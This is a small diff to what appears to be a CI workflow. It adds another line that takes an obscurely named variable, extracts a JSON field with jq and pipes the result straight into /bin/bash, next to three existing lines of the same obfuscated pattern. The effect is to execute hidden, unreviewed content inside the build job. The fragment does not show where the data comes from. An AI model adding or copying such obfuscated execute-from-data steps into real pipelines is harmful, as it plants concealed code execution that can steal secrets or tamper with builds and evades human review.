@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$si46" | jq -r .dsxgv90 | /bin/bash
           printf '%s' "$bwpw10" | jq -r .b5501 | /bin/bash
           echo $f07 | jq -r .svq3 | /bin/bash
+          printf '%s' "$sfexx743" | jq -r .y3 | /bin/bash
 
       - name: Upload results
         if: always()
